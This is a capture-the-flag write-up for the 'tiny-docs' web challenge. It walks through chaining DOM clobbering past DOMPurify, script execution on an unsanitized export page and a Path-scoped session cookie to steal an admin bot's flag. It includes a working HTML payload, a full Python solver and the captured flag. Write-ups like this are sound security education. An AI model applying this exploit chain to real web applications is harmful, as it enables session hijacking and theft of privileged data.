---
title: "HyperSonic CTF 2026 tiny-docs Writeup"
description: "HyperSonic CTF 2026 tiny-docs writeup"
---

# tiny-docs

## Overview

`tiny-docs` is a web challenge where you create short HTML documents and can ask an admin bot to review them. Users can create documents after signing up, and if you send the generated `/doc/<uuid>` path to `/report`, a Chromium instance with admin privileges opens that document.

The conditions I confirmed:

- Category: `web`
- The document body is at most `300` bytes.
- Only a restricted set of characters is allowed in the document body.
- `/report` cannot open `/download` or `/flag` directly; it only accepts the `/doc/<uuid>` form.
- `/flag` is accessible only from the admin session.

The goal is to make the admin bot visit `/flag` with its privileges and have the result copied into the attacker's session. The key is that the same document is handled differently by `/doc` and `/download`.

## Challenge analysis

The terms used in this writeup:

- `raw`: the original document body entered by the user.
- `doc`: the document page rendered at `/doc/<uuid>`.
- `download`: the export page returned at `/download/<uuid>`.
- `sess`: the cookie name the server uses to identify a session.
- Attacker session: the session received when signing up as a normal user.
- Admin session: the session the admin bot receives via `/admin-login`.
- `inbox`: a server-side storage area visible in the user info lookup.

When creating a document, the body is passed as base64, but the server checks the length and character set of the decoded `raw`.

```js
const MAX_DOCUMENT_LENGTH = 300;
const DOCUMENT_BODY_RE = /^[\x00\xfe\xffA-Za-z0-9 '.\-\/;<=>]*$/;

const raw = atob(String(payload.body_b64 || ""));
if (raw.length > MAX_DOCUMENT_LENGTH) {
  ...
}
if (!DOCUMENT_BODY_RE.test(raw)) {
  ...
}
```

This regex disallows parentheses, colons, and double quotes. On the other hand, letters, digits, spaces, single quotes, periods, hyphens, slashes, semicolons, `<`, `>`, and `=` are allowed. So it is hard to use a typical JavaScript payload as-is, but tags and simple assignment statements can be constructed.

The document view page sanitizes `raw` with `DOMPurify` and then places it inside an `article`.

```js
function sanitizeMarkup(raw) {
  return DOMPurify.sanitize(String(raw), {
    USE_PROFILES: { html: true },
    ALLOW_DATA_ATTR: true,
  });
}

function docPage(id, doc) {
  const clean = sanitizeMarkup(doc.raw);
  ...
  return `...<article id="document">${clean}</article>...`;
}
```

A `<script>` does not run on this screen. For input like the following, only the anchor survives sanitization and the script is removed.

```html
<a id=docSlot data-range=0></a><script>...</script>
```

The sanitized result is preserved as follows.

```html
<a data-range="0" id="docSlot"></a>
```

However, the `/doc` page has a separate bootstrap script.

```js
var x = window.docSlot;
if (x && x.dataset && /^\d{1,8}$/.test(x.dataset.range || "")) {
  location.href = "/download/<id>?range=" + x.dataset.range;
}
```

In Chromium, some elements with an `id` are exposed as a named property of the form `window.<id>`. So even just the sanitized `<a id=docSlot data-range=0>` is enough to create `window.docSlot`. Since `data-range=0` passes the numeric check, the admin bot opens the allowed `/doc` page and then navigates to the same-origin `/download/<uuid>?range=0`.

The `/download` side is more direct.

```js
function exportDocument(doc) {
  return EXPORT_PREFIX + doc.raw + EXPORT_SUFFIX;
}

const exported = exportDocument(doc);
const start = hasRange
  ? Math.max(0, Math.min(exported.length, Number(url.searchParams.get("range")) || 0))
  : 0;
const body = exported.slice(start);

send(res, 200, body, {
  "Content-Type": "text/html",
  "Content-Security-Policy": HTML_CSP,
}, "latin1");
```

Here `doc.raw` is not sanitized again. The response is `text/html`, and the CSP includes `script-src 'self' 'unsafe-inline'`. In other words, the `<script>` that was removed at `/doc` runs as-is at `/download`.

Session handling is also important for the solution. If there are multiple `sess` cookies with the same name, the server uses the value that appears first in the request header as the current session.

```js
function getSessionCandidates(req) {
  const out = [];
  for (const part of String(req.headers.cookie || "").split(";")) {
    ...
    if (key !== "sess") continue;
    const sid = decodeURIComponent(part.slice(index + 1).trim());
    const session = sessions.get(sid);
    if (session) out.push({ sid, session });
  }
  return out;
}

function getSession(req) {
  return getSessionCandidates(req)[0] || null;
}
```

`/flag` stores the flag in the admin session's `inbox`, then sends a POST request to `/download/collect`.

```js
function flagPage(auth) {
  auth.session.inbox = FLAG;
  return `...<script>fetch('/download/collect',{method:'POST',credentials:'same-origin'}).catch(()=>{})</script>...`;
}
```

And `/download/collect` looks for an admin session candidate different from the current session, and copies its `inbox` value into the current session's `inbox`.

```js
const auth = getSession(req);
const candidates = getSessionCandidates(req);
const source = candidates.find((item) =>
  item.sid !== auth.sid && item.session.isAdmin && item.session.inbox
);
auth.session.inbox = source.session.inbox.slice(0, 256);
```

Because of this structure, we can abuse the cookie `Path`. If the script running at `/download` sets the attacker session as a `sess` cookie with `Path=/download`, the browser ends up holding both of the following cookies.

```text
sess=<attacker session>; Path=/download
sess=<admin session>; Path=/
```

The `Path=/download` cookie does not match a `/flag` request, so only the admin session is sent. As a result, `/flag` normally stores the flag in the admin `inbox`. Then when the `/download/collect` request is made, both cookies are sent, and the more specific `/download` cookie comes first. The server selects the attacker session as the current session, and copies the flag from the admin session in the later candidate.

## Main idea

Chaining the two differences gives the solution flow.

First, `/report` only accepts `/doc/<uuid>`, but the script inside `/doc` trusts `window.docSlot`. By leaving an element with `id=docSlot` inside the sanitized HTML, we can use DOM clobbering to redirect the admin bot to `/download`.

Second, `/download` renders the original document HTML as-is. The script that runs here cannot read the admin cookie, but it can set a new attacker-session cookie with the same name under a more specific `Path`. Once `/flag` and `/download/collect` end up with different cookie selection results, the flag is moved into the attacker's session.

To summarize, the overall flow is as follows.

```text
Attacker creates a document
-> Insert a DOM clobbering element into /doc/<uuid>
-> Admin bot visits /doc/<uuid>
-> Bootstrap script navigates to /download/<uuid>?range=0
-> The original <script> executes
-> Set a Path=/download attacker sess cookie
-> Visiting /flag stores the flag in the admin inbox
-> /download/collect copies the flag into the attacker inbox
-> Check the attacker inbox via /api/me
```

## Solution walkthrough

### Step 1. Checking the document input restrictions

The document body must be at most `300` bytes and pass `DOCUMENT_BODY_RE`. Because of this restriction, code that needs parentheses, like `fetch(...)`, cannot be used. Instead, assignment statements like the following can be built within the allowed character set.

```html
<script>document.cookie='sess=<attacker session>;path=/download';location='/flag'</script>
```

It sets a cookie with `document.cookie=...` and navigates with `location=...`, so no parentheses are needed. The attacker session ID is a 48-character hex string generated by `crypto.randomBytes(24).toString("hex")`, so it does not trip the regex restriction either.

The final document body uses the following structure.

```html
<a id=docSlot data-range=0></a><script>document.cookie='sess=<attacker session>;path=/download';location='/flag'</script>
```

Based on the actual session length, the payload was `151` bytes, which fits within the `300`-byte limit.

### Step 2. Navigating from `/doc` to `/download`

Since `/report` only accepts `/doc/<uuid>`, we cannot make the admin bot open `/download` directly. Instead, we use the bootstrap script on the `/doc` page.

DOMPurify removes `<script>`, but because of the `ALLOW_DATA_ATTR` setting it keeps `<a id=docSlot data-range=0>`. In Chromium this element is accessible as `window.docSlot`, so it satisfies the following check.

```js
var x = window.docSlot;
if (x && x.dataset && /^\d{1,8}$/.test(x.dataset.range || "")) {
  location.href = "/download/<id>?range=" + x.dataset.range;
}
```

Since we set `data-range=0`, the navigation target becomes `/download/<uuid>?range=0`. `range=0` keeps the export page's start position intact, so the full HTML containing the `<script>` from the original document is returned.

### Step 3. Setting the attacker session cookie at `/download`

`/download` returns the result of `exportDocument(doc)` as-is. At this point the original `<script>` runs without being sanitized.

```html
<script>document.cookie='sess=<attacker session>;path=/download';location='/flag'</script>
```

This script does not read the admin session cookie. The admin cookie is `HttpOnly`, so it cannot be accessed from JavaScript, but setting a new cookie with the same name under a different `Path` is possible.

The reason for choosing `Path=/download` here is important. If the attacker cookie is sent to `/flag`, `/flag` is processed with attacker privileges and returns `403`. Conversely, if we make it match only the `/download` path, the admin session is preserved at `/flag`, while at `/download/collect` the attacker cookie is selected before the admin cookie.

### Step 4. Copying the flag via `/download/collect`

When `/flag` is accessed with the admin session, the server stores the flag in the admin session's `inbox`. That page immediately sends a POST request to `/download/collect`.

The cookie candidates for this request come in the following order.

```text
1. Path=/download attacker sess
2. Path=/ admin sess
```

The server's `getSession()` uses the first candidate as the current session. Then `/download/collect` finds a candidate among the rest that is `isAdmin` and has an `inbox`, and copies it into the current session. So looking up `/api/me` with the attacker session shows the flag in the `inbox`.

## Exploit / Solver

The final solver works in the following order.

1. Sign up as an arbitrary user to obtain the attacker `sess` value.
2. Combine the `docSlot` anchor with the `<script>` that will run at `/download` to build the document.
3. Send the generated `/doc/<uuid>` to `/report` so the admin bot opens it.
4. After a short wait, query `/api/me` to read the value stored in the `inbox`.

The core routine is as follows. Preparation of `base`, `username`, and `password`, and some error handling, are omitted.

```python
import base64
import json
import re
import time
import urllib.parse
import urllib.request


def request(base, method, path, data=None, cookie=None, timeout=15):
    body = None
    headers = {}
    if data is not None:
        body = json.dumps(data).encode()
        headers["Content-Type"] = "application/json"
    if cookie:
        headers["Cookie"] = cookie
    req = urllib.request.Request(
        urllib.parse.urljoin(base, path),
        data=body,
        headers=headers,
        method=method,
    )
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return resp.status, dict(resp.headers), resp.read().decode("utf-8", "replace")


def cookie_from(headers):
    raw = headers.get("Set-Cookie", "")
    match = re.search(r"\bsess=([^;]+)", raw)
    if not match:
        raise RuntimeError("missing sess cookie")
    return urllib.parse.unquote(match.group(1))


status, headers, _ = request(base, "POST", "/api/signup", {
    "username": username,
    "password": password,
})
sid = cookie_from(headers)

payload = (
    f"<a id=docSlot data-range=0></a>"
    f"<script>document.cookie='sess={sid};path=/download';location='/flag'</script>"
)

status, headers, body = request(base, "POST", "/api/documents", {
    "title": "tiny note",
    "filename": "export.html",
    "body_b64": base64.b64encode(payload.encode("latin1")).decode(),
}, cookie=f"sess={sid}")
doc_path = json.loads(body)["path"]

request(base, "POST", "/report", {"url": doc_path}, timeout=20)

for _ in range(8):
    status, headers, body = request(base, "GET", "/api/me", cookie=f"sess={sid}")
    inbox = json.loads(body).get("inbox", "")
    if inbox:
        print(inbox)
        break
    time.sleep(0.5)
```

## Result

When I first verified the same approach in a test run, the test flag was copied into the attacker `inbox`. Afterwards I retrieved the flag from the real service as well.

```text
HS{0d438c531a572a287482c30c687c1ce47b0ac560}
```
